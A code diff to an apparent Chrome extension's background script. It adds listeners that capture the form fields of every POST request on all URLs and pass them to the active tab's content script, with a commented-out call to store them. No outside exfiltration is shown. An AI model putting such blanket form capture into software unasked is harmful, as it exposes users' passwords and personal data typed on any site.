@@ -1,11 +1,12 @@
 import RequestHelper from '../Popup/helpers/request.helper';
-// import StorageHelper from '../Popup/helpers/storage.helper';
+import StorageHelper from '../Popup/helpers/storage.helper';
 import '../../assets/img/icon-34.png';
 import '../../assets/img/icon-128.png';
 
 class Background {
   constructor() {
     this.clickHandler = this.clickHandler.bind(this);
+    this.handleWebRequest = this.handleWebRequest.bind(this);
   }
 
   async search(query) {
@@ -82,7 +83,7 @@ class Background {
   }
 
   clickHandler(info, tab) {
-    chrome.tabs.sendMessage(tab.id, 'getClickedEl', ({ msg }) => {
+    chrome.tabs.sendMessage(tab.id, { type: 'getClickedEl' }, ({ msg }) => {
       console.log(msg);
     });
   }
@@ -109,9 +110,60 @@ class Background {
     });
   }
 
+  handleWebRequest() {
+    const arr = [];
+
+    chrome.webRequest.onBeforeRequest.addListener(
+      (details) => {
+        if (details.method === 'POST') {
+          const formData = details.requestBody.formData;
+
+          if (formData) {
+            Object.keys(formData).forEach((key) => {
+              const item = {
+                [key]: formData[key][0],
+              };
+
+              arr.push(item);
+            });
+
+            // storageHelper.save({ key: 'collected', data: arr });
+          }
+        }
+      },
+      { urls: ['<all_urls>'] },
+      ['requestBody']
+    );
+
+    chrome.webRequest.onCompleted.addListener(
+      (details) => {
+        if (details.method === 'POST') {
+          setTimeout(() => {
+            chrome.tabs.query(
+              { active: true, currentWindow: true },
+              function (tabs) {
+                console.log(tabs);
+                chrome.tabs.sendMessage(
+                  tabs[0].id,
+                  { type: 'getFormData', data: arr },
+                  (response) => {
+                    console.log('response received', response);
+                  }
+                );
+              }
+            );
+          }, 1000);
+        }
+      },
+      { urls: ['<all_urls>'] },
+      ['responseHeaders']
+    );
+  }
+
   init() {
     this.syncData();
     this.createContextMenu();
+    this.handleWebRequest();
   }
 }
 
